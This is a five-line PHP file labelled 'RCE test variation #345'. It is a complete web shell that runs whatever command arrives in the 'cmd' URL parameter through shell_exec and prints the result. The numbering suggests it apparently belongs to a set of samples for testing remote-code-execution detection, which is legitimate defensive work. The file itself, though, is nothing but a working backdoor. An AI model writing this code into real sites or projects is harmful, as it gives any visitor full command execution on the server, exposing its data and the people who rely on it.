<?php
// RCE test variation #345
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>